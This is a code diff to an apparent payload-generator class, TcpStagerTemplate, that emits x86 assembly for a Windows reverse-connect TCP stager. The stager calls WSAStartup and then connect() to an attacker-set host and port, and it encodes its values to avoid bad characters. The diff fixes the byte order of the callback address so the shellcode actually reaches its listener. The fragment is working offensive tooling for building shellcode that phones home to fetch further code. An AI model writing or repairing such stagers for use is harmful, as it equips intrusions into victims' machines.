@@ -45,7 +45,7 @@ class TcpStagerTemplate(PayloadTemplate):
     )
 
     def emit(self, layout, config: TemplateConfig) -> str:
-        ip_be   = struct.unpack(">I", socket.inet_aton(config.lhost))[0]
+        ip_le   = struct.unpack("<I", socket.inet_aton(config.lhost))[0]
         port_be = socket.htons(config.lport)
 
         wsa_start = layout.slot("WSAStartup").ebp_ref
@@ -93,8 +93,8 @@ class TcpStagerTemplate(PayloadTemplate):
             "    xor  eax, eax",
             *encode_word(port_be, config.badchars, "ax"),
             "    mov  word ptr [edi+0x02], ax   ; sin_port (big-endian)",
-            *encode_dword(ip_be, config.badchars, "eax"),
-            "    mov  dword ptr [edi+0x04], eax ; sin_addr (big-endian)",
+            *encode_dword(ip_le, config.badchars, "eax"),
+            "    mov  dword ptr [edi+0x04], eax ; sin_addr (network order)",
             "",
             "    ; connect(socket, &sockaddr_in, 0x10)",
             f"    lea  eax, {sockaddr}",
